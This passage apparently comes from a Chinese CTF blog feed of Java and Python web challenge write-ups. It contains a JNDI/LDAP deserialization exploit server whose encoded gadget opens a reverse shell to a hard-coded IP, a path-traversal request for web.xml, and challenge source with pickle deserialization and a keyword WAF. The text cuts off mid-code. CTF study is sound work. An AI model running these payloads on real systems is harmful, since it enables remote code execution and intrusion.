class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="comment">//高版本LDAP绕过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://107.148.75.202:8000/#Evail&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAGnQAFm9yZy5leGFtcGxlLlVuc2VyaWFsXzF0AA9VbnNlcmlhbF8xLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AFXhzcgAeY29tLmFsaWJhYmEuZmFzdGpzb24uSlNPTkFycmF5AAAAAAAAAAECAAFMAARsaXN0cQB+AAd4cHNxAH4AFAAAAAF3BAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AAVMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAcnK/rq+AAAAMwAaAQABQQcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAGQS5qYXZhAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABwEABjxpbml0PgEAAygpVgwACQAKCgAIAAsBABFqYXZhL2xhbmcvUnVudGltZQcADQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA8AEAoADgARAQBhYmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TURjdU1UUTRMamMxTGpJd01pOHhNak0wSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAEwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABUAFgoADgAXAQAEQ29kZQAhAAIACAAAAAAAAQABAAkACgABABkAAAAaAAIAAQAAAA4qtwAMuAASEhS2ABhXsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHg=&quot;</span>));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020青龙组-FileJava"><a href="#网鼎杯-2020青龙组-FileJava" class="headerlink" title="[网鼎杯 2020青龙组]FileJava"></a>[网鼎杯 2020青龙组]FileJava</h2><p>读web.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file_in_java/DownloadServlet?filename=../../../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CVE-20143529</p><h2 id="CISCN-2023-西南-seaclouds"><a href="#CISCN-2023-西南-seaclouds" class="headerlink" title="[CISCN 2023 西南]seaclouds"></a>[CISCN 2023 西南]seaclouds</h2><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18172377">https://www.cnblogs.com/EddieMurphy-blogs/p/18172377</a></p><p><a href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></p><p><a href="https://xz.aliyun.com/t/13345">https://xz.aliyun.com/t/13345</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/13279">https://xz.aliyun.com/t/13279</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/15801116.html">https://www.cnblogs.com/kingbridge/articles/15801116.html</a></p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md">https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md</a></p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md">https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md</a></p><h2 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/13279">https://xz.aliyun.com/t/13279</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/15801116.html">https://www.cnblogs.com/kingbridge/articles/15801116.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN-2023-初赛-DeserBug&quot;&gt;&lt;a href=&quot;#CISCN-2023-初赛-DeserBug&quot; class=&quot;headerlink&quot; title=&quot;[CISCN 2023 初赛]DeserBug&quot;&gt;&lt;/a&gt;[CISCN 2023 初赛]Dese</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2024 Web</title>
    <link href="http://example.com/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-Web/"/>
    <id>http://example.com/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-Web/</id>
    <published>2024-08-28T04:35:51.000Z</published>
    <updated>2024-08-28T05:15:36.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2024-Web-题解"><a href="#羊城杯2024-Web-题解" class="headerlink" title="羊城杯2024 Web 题解"></a>羊城杯2024 Web 题解</h1><p>总算没有爆零, 解出了两题, ez_java花费了太多时间, 还有一个tomtom2没做出来有点小遗憾</p><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p>文件读取直接读&#x2F;proc&#x2F;self&#x2F;cmdline</p><p>然后就可以读源码了</p><p>lyrics.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> config.secret_key <span class="keyword">import</span> secret_code</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, render_template</span><br><span class="line"><span class="keyword">from</span> cookie <span class="keyword">import</span> set_cookie, cookie_check, get_cookie</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = random.randbytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserData</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username</span>):</span><br><span class="line">        self.username = username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/lyrics&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lyrics</span>():</span><br><span class="line">    resp = make_response()</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&#x27;text/plain; charset=UTF-8&#x27;</span></span><br><span class="line">    query = request.args.get(<span class="string">&quot;lyrics&quot;</span>)</span><br><span class="line">    path = os.path.join(os.getcwd() + <span class="string">&quot;/lyrics&quot;</span>, query)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">            res = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No lyrics found&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        user = UserData(username)</span><br><span class="line">        res = &#123;<span class="string">&quot;username&quot;</span>: user.username&#125;</span><br><span class="line">        <span class="keyword">return</span> set_cookie(<span class="string">&quot;user&quot;</span>, res, secret=secret_code)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/board&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">board</span>():</span><br><span class="line">    invalid = cookie_check(<span class="string">&quot;user&quot;</span>, secret=secret_code)</span><br><span class="line">    <span class="keyword">if</span> invalid:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope, invalid code get out!&quot;</span></span><br><span class="line">    data = get_cookie(<span class="string">&quot;user&quot;</span>, secret=secret_code)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">        a = pickle.loads(data)</span><br><span class="line">        data = <span class="built_in">str</span>(data, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;username&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, name=data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;username&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;user.html&#x27;</span>, name=data[<span class="string">&quot;username&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据源码import的包名, 把他们也读出来</p><p>cookie.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response, request</span><br><span class="line"></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line">basestring = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quoted from python bottle template, thanks :D</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, 